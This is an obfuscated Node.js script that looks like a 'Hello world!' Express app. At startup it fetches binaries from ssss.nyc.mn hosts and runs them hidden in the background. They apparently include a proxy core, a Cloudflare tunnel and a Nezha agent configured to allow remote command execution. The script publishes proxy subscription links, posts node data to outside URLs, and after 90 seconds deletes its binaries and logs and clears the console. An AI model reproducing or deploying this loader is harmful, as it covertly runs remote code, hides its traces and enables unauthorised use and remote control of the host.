const _0x2e09c5=_0x1c32;(function(_0x58e522,_0x3a59cf){const _0x4f2957=_0x1c32,_0x569b47=_0x58e522();while(!![]){try{const _0xe4eabf=-parseInt(_0x4f2957(0x1f3))/0x1*(parseInt(_0x4f2957(0x21f))/0x2)+parseInt(_0x4f2957(0x261))/0x3*(parseInt(_0x4f2957(0x1f1))/0x4)+-parseInt(_0x4f2957(0x22f))/0x5+-parseInt(_0x4f2957(0x297))/0x6+-parseInt(_0x4f2957(0x200))/0x7+parseInt(_0x4f2957(0x20b))/0x8*(-parseInt(_0x4f2957(0x259))/0x9)+parseInt(_0x4f2957(0x25f))/0xa;if(_0xe4eabf===_0x3a59cf)break;else _0x569b47['push'](_0x569b47['shift']());}catch(_0x3feacb){_0x569b47['push'](_0x569b47['shift']());}}}(_0x142f,0xeea62));const app=express(),axios=require(_0x2e09c5(0x22c)),os=require('os'),fs=require('fs'),path=require(_0x2e09c5(0x266)),{promisify}=require('util'),exec=promisify(require(_0x2e09c5(0x287))[_0x2e09c5(0x267)]),{execSync}=require(_0x2e09c5(0x287)),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0x2e09c5(0x24e)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x2e09c5(0x24e)][_0x2e09c5(0x279)]||![],FILE_PATH=process[_0x2e09c5(0x24e)][_0x2e09c5(0x21e)]||_0x2e09c5(0x255),SUB_PATH=process[_0x2e09c5(0x24e)][_0x2e09c5(0x280)]||_0x2e09c5(0x1f9),PORT=process[_0x2e09c5(0x24e)][_0x2e09c5(0x26f)]||process['env'][_0x2e09c5(0x252)]||0xbb8,UUID=process['env'][_0x2e09c5(0x207)]||_0x2e09c5(0x27f),NEZHA_SERVER=process[_0x2e09c5(0x24e)][_0x2e09c5(0x1f4)]||'',NEZHA_PORT=process[_0x2e09c5(0x24e)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x2e09c5(0x24e)][_0x2e09c5(0x299)]||'',ARGO_DOMAIN=process[_0x2e09c5(0x24e)][_0x2e09c5(0x241)]||'',ARGO_AUTH=process[_0x2e09c5(0x24e)][_0x2e09c5(0x228)]||'',ARGO_PORT=process[_0x2e09c5(0x24e)][_0x2e09c5(0x27a)]||0x1f41,CFIP=process[_0x2e09c5(0x24e)][_0x2e09c5(0x203)]||_0x2e09c5(0x232),CFPORT=process[_0x2e09c5(0x24e)][_0x2e09c5(0x21a)]||0x1bb,NAME=process[_0x2e09c5(0x24e)][_0x2e09c5(0x2a6)]||'';!fs['existsSync'](FILE_PATH)?(fs[_0x2e09c5(0x265)](FILE_PATH),console[_0x2e09c5(0x21d)](FILE_PATH+_0x2e09c5(0x227))):console[_0x2e09c5(0x21d)](FILE_PATH+_0x2e09c5(0x269));function generateRandomName(){const _0x44c753=_0x2e09c5,_0x1578e0='abcdefghijklmnopqrstuvwxyz';let _0x233ddb='';for(let _0x367993=0x0;_0x367993<0x6;_0x367993++){_0x233ddb+=_0x1578e0['charAt'](Math[_0x44c753(0x25d)](Math['random']()*_0x1578e0[_0x44c753(0x244)]));}return _0x233ddb;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2e09c5(0x268)](FILE_PATH,npmName),phpPath=path[_0x2e09c5(0x268)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x2e09c5(0x268)](FILE_PATH,botName),subPath=path[_0x2e09c5(0x268)](FILE_PATH,'sub.txt'),listPath=path[_0x2e09c5(0x268)](FILE_PATH,_0x2e09c5(0x263)),bootLogPath=path[_0x2e09c5(0x268)](FILE_PATH,_0x2e09c5(0x28d)),configPath=path[_0x2e09c5(0x268)](FILE_PATH,_0x2e09c5(0x20e));function deleteNodes(){const _0x3858a0=_0x2e09c5;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x344bce;try{_0x344bce=fs[_0x3858a0(0x29b)](subPath,_0x3858a0(0x223));}catch{return null;}const _0x4bc478=Buffer[_0x3858a0(0x202)](_0x344bce,_0x3858a0(0x214))[_0x3858a0(0x285)]('utf-8'),_0x190033=_0x4bc478[_0x3858a0(0x225)]('\x0a')['filter'](_0xa5256=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xa5256));if(_0x190033[_0x3858a0(0x244)]===0x0)return;return axios[_0x3858a0(0x29a)](UPLOAD_URL+_0x3858a0(0x21b),JSON[_0x3858a0(0x234)]({'nodes':_0x190033}),{'headers':{'Content-Type':'application/json'}})[_0x3858a0(0x218)](_0x73112a=>{return null;}),null;}catch(_0x256c81){return null;}}function cleanupOldFiles(){const _0x35645e=_0x2e09c5;try{const _0x3ec273=fs[_0x35645e(0x1ee)](FILE_PATH);_0x3ec273[_0x35645e(0x294)](_0x3cf486=>{const _0x5d8419=_0x35645e,_0x5180f5=path[_0x5d8419(0x268)](FILE_PATH,_0x3cf486);try{const _0x2384e8=fs[_0x5d8419(0x208)](_0x5180f5);_0x2384e8['isFile']()&&fs['unlinkSync'](_0x5180f5);}catch(_0x3f89c2){}});}catch(_0x4d701e){}}app[_0x2e09c5(0x216)]('/',function(_0x4bb12b,_0x5ec5fb){const _0x355871=_0x2e09c5;_0x5ec5fb[_0x355871(0x246)](_0x355871(0x242));});async function generateConfig(){const _0x3d8fcd=_0x2e09c5,_0x45d117={'log':{'access':_0x3d8fcd(0x284),'error':_0x3d8fcd(0x284),'loglevel':_0x3d8fcd(0x2a0)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3d8fcd(0x26d),'settings':{'clients':[{'id':UUID,'flow':_0x3d8fcd(0x283)}],'decryption':_0x3d8fcd(0x2a0),'fallbacks':[{'dest':0xbb9},{'path':_0x3d8fcd(0x27d),'dest':0xbba},{'path':_0x3d8fcd(0x209),'dest':0xbbb},{'path':_0x3d8fcd(0x2a7),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x3d8fcd(0x293),'protocol':_0x3d8fcd(0x26d),'settings':{'clients':[{'id':UUID}],'decryption':_0x3d8fcd(0x2a0)},'streamSettings':{'network':_0x3d8fcd(0x20d),'security':_0x3d8fcd(0x2a0)}},{'port':0xbba,'listen':_0x3d8fcd(0x293),'protocol':_0x3d8fcd(0x26d),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3d8fcd(0x2a0)},'streamSettings':{'network':'ws','security':_0x3d8fcd(0x2a0),'wsSettings':{'path':_0x3d8fcd(0x27d)}},'sniffing':{'enabled':!![],'destOverride':[_0x3d8fcd(0x238),_0x3d8fcd(0x27b),_0x3d8fcd(0x23d)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3d8fcd(0x293),'protocol':_0x3d8fcd(0x295),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3d8fcd(0x209)}},'sniffing':{'enabled':!![],'destOverride':[_0x3d8fcd(0x238),_0x3d8fcd(0x27b),_0x3d8fcd(0x23d)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3d8fcd(0x293),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3d8fcd(0x2a0),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x3d8fcd(0x238),_0x3d8fcd(0x27b),_0x3d8fcd(0x23d)],'metadataOnly':![]}}],'dns':{'servers':[_0x3d8fcd(0x28c)]},'outbounds':[{'protocol':'freedom','tag':_0x3d8fcd(0x274)},{'protocol':_0x3d8fcd(0x1fe),'tag':_0x3d8fcd(0x24f)}]};fs['writeFileSync'](path[_0x3d8fcd(0x268)](FILE_PATH,_0x3d8fcd(0x20e)),JSON[_0x3d8fcd(0x234)](_0x45d117,null,0x2));}function getSystemArchitecture(){const _0x57e938=_0x2e09c5,_0x31f59a=os[_0x57e938(0x23f)]();return _0x31f59a===_0x57e938(0x24c)||_0x31f59a===_0x57e938(0x229)||_0x31f59a===_0x57e938(0x262)?'arm':_0x57e938(0x215);}function downloadFile(_0x2c6bbe,_0x50d8fd,_0x19aad2){const _0x1170be=_0x2e09c5,_0xab2c2=_0x2c6bbe;!fs[_0x1170be(0x1fb)](FILE_PATH)&&fs[_0x1170be(0x265)](FILE_PATH,{'recursive':!![]});const _0x59e814=fs[_0x1170be(0x28a)](_0xab2c2);axios({'method':_0x1170be(0x216),'url':_0x50d8fd,'responseType':_0x1170be(0x1f6)})['then'](_0xa7178e=>{const _0x4f379b=_0x1170be;_0xa7178e['data'][_0x4f379b(0x24d)](_0x59e814),_0x59e814['on'](_0x4f379b(0x1f7),()=>{const _0x17509a=_0x4f379b;_0x59e814['close'](),console[_0x17509a(0x21d)](_0x17509a(0x26e)+path[_0x17509a(0x291)](_0xab2c2)+_0x17509a(0x26c)),_0x19aad2(null,_0xab2c2);}),_0x59e814['on'](_0x4f379b(0x278),_0x348bf8=>{const _0x1c796e=_0x4f379b;fs['unlink'](_0xab2c2,()=>{});const _0x609b94=_0x1c796e(0x26e)+path[_0x1c796e(0x291)](_0xab2c2)+_0x1c796e(0x1f0)+_0x348bf8[_0x1c796e(0x239)];console[_0x1c796e(0x278)](_0x609b94),_0x19aad2(_0x609b94);});})[_0x1170be(0x218)](_0x502208=>{const _0x43a21a=_0x1170be,_0x129b24=_0x43a21a(0x26e)+path[_0x43a21a(0x291)](_0xab2c2)+_0x43a21a(0x1f0)+_0x502208['message'];console['error'](_0x129b24),_0x19aad2(_0x129b24);});}async function downloadFilesAndRun(){const _0x1081cf=_0x2e09c5,_0x39e3b7=getSystemArchitecture(),_0x2312c0=getFilesForArchitecture(_0x39e3b7);if(_0x2312c0['length']===0x0){console['log'](_0x1081cf(0x257));return;}const _0x53d1cd=_0x2312c0['map'](_0x242852=>{return new Promise((_0x256a5c,_0x26cf74)=>{const _0x211e85=_0x1c32;downloadFile(_0x242852['fileName'],_0x242852[_0x211e85(0x204)],(_0x46c2d6,_0x2d0ea4)=>{_0x46c2d6?_0x26cf74(_0x46c2d6):_0x256a5c(_0x2d0ea4);});});});try{await Promise[_0x1081cf(0x220)](_0x53d1cd);}catch(_0x423b73){console[_0x1081cf(0x278)](_0x1081cf(0x264),_0x423b73);return;}function _0x24b4de(_0x47fc29){const _0x4fefaa=_0x1081cf,_0x540567=0x1fd;_0x47fc29[_0x4fefaa(0x294)](_0x51b37e=>{const _0x46b3c2=_0x4fefaa;fs[_0x46b3c2(0x1fb)](_0x51b37e)&&fs[_0x46b3c2(0x2a5)](_0x51b37e,_0x540567,_0x475df=>{const _0x436c5d=_0x46b3c2;_0x475df?console[_0x436c5d(0x278)](_0x436c5d(0x256)+_0x51b37e+':\x20'+_0x475df):console[_0x436c5d(0x21d)](_0x436c5d(0x271)+_0x51b37e+':\x20'+_0x540567[_0x436c5d(0x285)](0x8));});});}const _0x4a39e6=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x24b4de(_0x4a39e6);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x51e5d1=NEZHA_SERVER[_0x1081cf(0x236)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x12d9c7=new Set([_0x1081cf(0x26b),_0x1081cf(0x28e),'2096','2087','2083','2053']),_0x1bd34c=_0x12d9c7[_0x1081cf(0x25c)](_0x51e5d1)?_0x1081cf(0x276):'false',_0x33033d=_0x1081cf(0x248)+NEZHA_KEY+_0x1081cf(0x25a)+NEZHA_SERVER+_0x1081cf(0x29d)+_0x1bd34c+_0x1081cf(0x24a)+UUID;fs[_0x1081cf(0x260)](path[_0x1081cf(0x268)](FILE_PATH,_0x1081cf(0x250)),_0x33033d);const _0x21a581=_0x1081cf(0x251)+phpPath+_0x1081cf(0x22a)+FILE_PATH+_0x1081cf(0x2a4);try{await exec(_0x21a581),console[_0x1081cf(0x21d)](phpName+_0x1081cf(0x1ff)),await new Promise(_0x45355b=>setTimeout(_0x45355b,0x3e8));}catch(_0x4b80ec){console[_0x1081cf(0x278)]('php\x20running\x20error:\x20'+_0x4b80ec);}}else{let _0x2296b5='';const _0x33924f=[_0x1081cf(0x26b),_0x1081cf(0x28e),_0x1081cf(0x23a),'2087','2083',_0x1081cf(0x237)];_0x33924f['includes'](NEZHA_PORT)&&(_0x2296b5='--tls');const _0x40f2cc=_0x1081cf(0x251)+npmPath+_0x1081cf(0x2a1)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1081cf(0x27c)+NEZHA_KEY+'\x20'+_0x2296b5+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x40f2cc),console[_0x1081cf(0x21d)](npmName+_0x1081cf(0x1ff)),await new Promise(_0x12c83a=>setTimeout(_0x12c83a,0x3e8));}catch(_0x5a3a98){console[_0x1081cf(0x278)](_0x1081cf(0x1fd)+_0x5a3a98);}}}else console[_0x1081cf(0x21d)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x14c570=_0x1081cf(0x251)+webPath+_0x1081cf(0x230)+FILE_PATH+_0x1081cf(0x2a3);try{await exec(_0x14c570),console['log'](webName+_0x1081cf(0x1ff)),await new Promise(_0x2ad74e=>setTimeout(_0x2ad74e,0x3e8));}catch(_0x301b57){console['error'](_0x1081cf(0x201)+_0x301b57);}if(fs['existsSync'](botPath)){let _0x1de926;if(ARGO_AUTH[_0x1081cf(0x231)](/^[A-Z0-9a-z=]{120,250}$/))_0x1de926=_0x1081cf(0x224)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x1de926=_0x1081cf(0x211)+FILE_PATH+'/tunnel.yml\x20run':_0x1de926='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x1de926+_0x1081cf(0x292)),console['log'](botName+_0x1081cf(0x1ff)),await new Promise(_0x500214=>setTimeout(_0x500214,0x7d0));}catch(_0x301abf){console[_0x1081cf(0x278)](_0x1081cf(0x23c)+_0x301abf);}}await new Promise(_0x55b604=>setTimeout(_0x55b604,0x1388));}function getFilesForArchitecture(_0x2e0271){const _0x4297b2=_0x2e09c5;let _0x3771fc;_0x2e0271===_0x4297b2(0x24c)?_0x3771fc=[{'fileName':webPath,'fileUrl':_0x4297b2(0x22d)},{'fileName':botPath,'fileUrl':_0x4297b2(0x254)}]:_0x3771fc=[{'fileName':webPath,'fileUrl':_0x4297b2(0x222)},{'fileName':botPath,'fileUrl':_0x4297b2(0x23e)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x422ea4=_0x2e0271===_0x4297b2(0x24c)?_0x4297b2(0x20f):_0x4297b2(0x1ec);_0x3771fc[_0x4297b2(0x205)]({'fileName':npmPath,'fileUrl':_0x422ea4});}else{const _0xfa9724=_0x2e0271==='arm'?_0x4297b2(0x22b):_0x4297b2(0x221);_0x3771fc[_0x4297b2(0x205)]({'fileName':phpPath,'fileUrl':_0xfa9724});}}return _0x3771fc;}function _0x142f(){const _0x28e321=['xtls-rprx-vision','/dev/null','toString','tunnel.yml','child_process','http\x20server\x20is\x20running\x20on\x20port:','\x0a\x20\x20tunnel:\x20','createWriteStream','TunnelSecret','https+local://8.8.8.8/dns-query','boot.log','8443','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','basename','\x20>/dev/null\x202>&1\x20&','127.0.0.1','forEach','vmess','&path=%2Fvless-argo%3Fed%3D2560#','8019924DHCvQH','filter','NEZHA_KEY','post','readFileSync','set','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0a\x20\x20\x0atrojan://','\x0a\x20\x20\x20\x20','none','\x20-s\x20','rm\x20-rf\x20','/config.json\x20>/dev/null\x202>&1\x20&','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','chmod','NAME','/trojan-argo','https://amd64.ssss.nyc.mn/agent','Unhandled\x20error\x20in\x20startserver:','readdirSync','trim','\x20failed:\x20','940IYEYGS','?security=tls&sni=','6gKCrVx','NEZHA_SERVER','firefox','stream','finish','/vmess-argo?ed=2560','sub','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','existsSync','win32','npm\x20running\x20error:\x20','blackhole','\x20is\x20running','9548QGDBPl','web\x20running\x20error:\x20','from','CFIP','fileUrl','unshift','application/json','UUID','statSync','/vmess-argo','\x20>\x20nul\x202>&1','308288KxkNdX','Content-Type','tcp','config.json','https://arm64.ssss.nyc.mn/agent','ARGO_DOMAIN:','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','charAt','base64','amd','get','?encryption=none&security=tls&sni=','catch','automatic\x20access\x20task\x20added\x20successfully','CFPORT','/api/delete-nodes','platform','log','FILE_PATH','638252dMXwhb','all','https://amd64.ssss.nyc.mn/v1','https://amd64.ssss.nyc.mn/web','utf-8','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','split','listen','\x20is\x20created','ARGO_AUTH','arm64','\x20-c\x20\x22','https://arm64.ssss.nyc.mn/v1','axios','https://arm64.ssss.nyc.mn/web','/api/add-nodes','8572535xDCgTZ','\x20-c\x20','match','cdns.doon.eu.org','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','stringify','App\x20is\x20running','includes','2053','http','message','2096','ArgoDomain:','Error\x20executing\x20command:\x20','quic','https://amd64.ssss.nyc.mn/bot','arch','del\x20/f\x20/q\x20','ARGO_DOMAIN','Hello\x20world!','Skipping\x20adding\x20automatic\x20access\x20task','length','\x0avless://','send','\x22\x20>\x20/dev/null\x202>&1','\x0aclient_secret:\x20','test','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','status','arm','pipe','env','block','config.yaml','nohup\x20','PORT','response','https://arm64.ssss.nyc.mn/bot','./tmp','Empowerment\x20failed\x20for\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','.exe\x20>\x20nul\x202>&1','261ZZJAXi','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','text/plain;\x20charset=utf-8','has','floor','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','58396260YlpVnv','writeFileSync','15609iJMEet','aarch64','list.txt','Error\x20downloading\x20files:','mkdirSync','path','exec','join','\x20already\x20exists','Error\x20reading\x20boot.log:','443','\x20successfully','vless','Download\x20','SERVER_PORT','push','Empowerment\x20success\x20for\x20','Nodes\x20uploaded\x20successfully','substring','direct','&fp=firefox&type=ws&host=','true','Subscription\x20uploaded\x20successfully','error','AUTO_ACCESS','ARGO_PORT','tls','\x20-p\x20','/vless-argo','tunnel.json','ca8718c8-c9e2-4929-a731-ab687e1e040a','SUB_PATH','unlinkSync','\x0a\x20\x20credentials-file:\x20'];_0x142f=function(){return _0x28e321;};return _0x142f();}function argoType(){const _0x43a34c=_0x2e09c5;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x43a34c(0x21d)](_0x43a34c(0x1fa));return;}if(ARGO_AUTH[_0x43a34c(0x236)](_0x43a34c(0x28b))){fs['writeFileSync'](path['join'](FILE_PATH,_0x43a34c(0x27e)),ARGO_AUTH);const _0x1bc653=_0x43a34c(0x289)+ARGO_AUTH['split']('\x22')[0xb]+_0x43a34c(0x282)+path[_0x43a34c(0x268)](FILE_PATH,_0x43a34c(0x27e))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x43a34c(0x290);fs['writeFileSync'](path[_0x43a34c(0x268)](FILE_PATH,_0x43a34c(0x286)),_0x1bc653);}else console[_0x43a34c(0x21d)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}function _0x1c32(_0x51512a,_0x55793b){const _0x142f38=_0x142f();return _0x1c32=function(_0x1c3261,_0xf49a9a){_0x1c3261=_0x1c3261-0x1ec;let _0x543268=_0x142f38[_0x1c3261];return _0x543268;},_0x1c32(_0x51512a,_0x55793b);}argoType();async function extractDomains(){const _0x497def=_0x2e09c5;let _0x20b55c;if(ARGO_AUTH&&ARGO_DOMAIN)_0x20b55c=ARGO_DOMAIN,console[_0x497def(0x21d)](_0x497def(0x210),_0x20b55c),await _0x5c0855(_0x20b55c);else try{const _0x4b52e=fs['readFileSync'](path[_0x497def(0x268)](FILE_PATH,_0x497def(0x28d)),_0x497def(0x223)),_0x1fce3f=_0x4b52e['split']('\x0a'),_0x174300=[];_0x1fce3f[_0x497def(0x294)](_0x118e22=>{const _0x543924=_0x118e22['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x543924){const _0x464741=_0x543924[0x1];_0x174300['push'](_0x464741);}});if(_0x174300[_0x497def(0x244)]>0x0)_0x20b55c=_0x174300[0x0],console[_0x497def(0x21d)](_0x497def(0x23b),_0x20b55c),await _0x5c0855(_0x20b55c);else{console[_0x497def(0x21d)](_0x497def(0x28f)),fs[_0x497def(0x281)](path['join'](FILE_PATH,'boot.log'));async function _0x506524(){const _0x5ad005=_0x497def;try{process['platform']===_0x5ad005(0x1fc)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x5ad005(0x258)):await exec('pkill\x20-f\x20\x22['+botName[_0x5ad005(0x213)](0x0)+']'+botName[_0x5ad005(0x273)](0x1)+_0x5ad005(0x247));}catch(_0x53aa54){}}_0x506524(),await new Promise(_0x15419f=>setTimeout(_0x15419f,0xbb8));const _0x4280fe=_0x497def(0x212)+FILE_PATH+_0x497def(0x233)+ARGO_PORT;try{await exec(_0x497def(0x251)+botPath+'\x20'+_0x4280fe+'\x20>/dev/null\x202>&1\x20&'),console[_0x497def(0x21d)](botName+_0x497def(0x1ff)),await new Promise(_0x229ebe=>setTimeout(_0x229ebe,0xbb8)),await extractDomains();}catch(_0x58583f){console[_0x497def(0x278)](_0x497def(0x23c)+_0x58583f);}}}catch(_0x2c98e8){console[_0x497def(0x278)](_0x497def(0x26a),_0x2c98e8);}async function _0x5c0855(_0x1cd5e7){const _0x106cce=_0x497def,_0x4b7ab5=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':'utf-8'}),_0x4ac0c4=_0x4b7ab5[_0x106cce(0x1ef)](),_0x2b056e=NAME?NAME+'-'+_0x4ac0c4:_0x4ac0c4;return new Promise(_0x5b58e0=>{setTimeout(()=>{const _0x2f0d60=_0x1c32,_0x2bad21={'v':'2','ps':''+_0x2b056e,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2f0d60(0x2a0),'net':'ws','type':_0x2f0d60(0x2a0),'host':_0x1cd5e7,'path':_0x2f0d60(0x1f8),'tls':_0x2f0d60(0x27b),'sni':_0x1cd5e7,'alpn':'','fp':_0x2f0d60(0x1f5)},_0x3a641c=_0x2f0d60(0x245)+UUID+'@'+CFIP+':'+CFPORT+_0x2f0d60(0x217)+_0x1cd5e7+_0x2f0d60(0x275)+_0x1cd5e7+_0x2f0d60(0x296)+_0x2b056e+'\x0a\x20\x20\x0avmess://'+Buffer[_0x2f0d60(0x202)](JSON[_0x2f0d60(0x234)](_0x2bad21))[_0x2f0d60(0x285)]('base64')+_0x2f0d60(0x29e)+UUID+'@'+CFIP+':'+CFPORT+_0x2f0d60(0x1f2)+_0x1cd5e7+'&fp=firefox&type=ws&host='+_0x1cd5e7+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x2b056e+_0x2f0d60(0x29f);console[_0x2f0d60(0x21d)](Buffer[_0x2f0d60(0x202)](_0x3a641c)[_0x2f0d60(0x285)](_0x2f0d60(0x214))),fs[_0x2f0d60(0x260)](subPath,Buffer[_0x2f0d60(0x202)](_0x3a641c)[_0x2f0d60(0x285)]('base64')),console[_0x2f0d60(0x21d)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x2f0d60(0x216)]('/'+SUB_PATH,(_0x571852,_0x464571)=>{const _0x418e39=_0x2f0d60,_0xfe250a=Buffer[_0x418e39(0x202)](_0x3a641c)[_0x418e39(0x285)](_0x418e39(0x214));_0x464571[_0x418e39(0x29c)](_0x418e39(0x20c),_0x418e39(0x25b)),_0x464571[_0x418e39(0x246)](_0xfe250a);}),_0x5b58e0(_0x3a641c);},0x7d0);});}}async function uploadNodes(){const _0xd72208=_0x2e09c5;if(UPLOAD_URL&&PROJECT_URL){const _0x6671e=PROJECT_URL+'/'+SUB_PATH,_0x212c22={'subscription':[_0x6671e]};try{const _0x4e1a43=await axios[_0xd72208(0x29a)](UPLOAD_URL+'/api/add-subscriptions',_0x212c22,{'headers':{'Content-Type':_0xd72208(0x206)}});return _0x4e1a43&&_0x4e1a43[_0xd72208(0x24b)]===0xc8?(console['log'](_0xd72208(0x277)),_0x4e1a43):null;}catch(_0x54ec05){if(_0x54ec05['response']){if(_0x54ec05[_0xd72208(0x253)][_0xd72208(0x24b)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xd72208(0x1fb)](listPath))return;const _0x306528=fs['readFileSync'](listPath,_0xd72208(0x223)),_0x705940=_0x306528[_0xd72208(0x225)]('\x0a')[_0xd72208(0x298)](_0x29a6fa=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xd72208(0x249)](_0x29a6fa));if(_0x705940['length']===0x0)return;const _0x41e7bc=JSON['stringify']({'nodes':_0x705940});try{const _0x38587a=await axios[_0xd72208(0x29a)](UPLOAD_URL+_0xd72208(0x22e),_0x41e7bc,{'headers':{'Content-Type':_0xd72208(0x206)}});return _0x38587a&&_0x38587a[_0xd72208(0x24b)]===0xc8?(console['log'](_0xd72208(0x272)),_0x38587a):null;}catch(_0x24bd32){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xee8aa=_0x1c32,_0x5ab00d=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5ab00d[_0xee8aa(0x270)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5ab00d['push'](phpPath);process[_0xee8aa(0x21c)]===_0xee8aa(0x1fc)?exec(_0xee8aa(0x240)+_0x5ab00d[_0xee8aa(0x268)]('\x20')+_0xee8aa(0x20a),_0x460640=>{const _0x483d82=_0xee8aa;console['clear'](),console[_0x483d82(0x21d)](_0x483d82(0x235)),console[_0x483d82(0x21d)](_0x483d82(0x25e));}):exec(_0xee8aa(0x2a2)+_0x5ab00d[_0xee8aa(0x268)]('\x20')+'\x20>/dev/null\x202>&1',_0x461475=>{const _0x52b982=_0xee8aa;console['clear'](),console[_0x52b982(0x21d)](_0x52b982(0x235)),console[_0x52b982(0x21d)](_0x52b982(0x25e));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1d70ed=_0x2e09c5;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x1d70ed(0x243));return;}try{const _0x5509c0=await axios[_0x1d70ed(0x29a)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1d70ed(0x206)}});return console[_0x1d70ed(0x21d)](_0x1d70ed(0x219)),_0x5509c0;}catch(_0x39c392){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x39c392[_0x1d70ed(0x239)]),null;}}async function startserver(){const _0x3e194b=_0x2e09c5;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3bd492){console[_0x3e194b(0x278)]('Error\x20in\x20startserver:',_0x3bd492);}}startserver()['catch'](_0x3a4d78=>{const _0x4d55fc=_0x2e09c5;console[_0x4d55fc(0x278)](_0x4d55fc(0x1ed),_0x3a4d78);}),app[_0x2e09c5(0x226)](PORT,()=>console[_0x2e09c5(0x21d)](_0x2e09c5(0x288)+PORT+'!'));
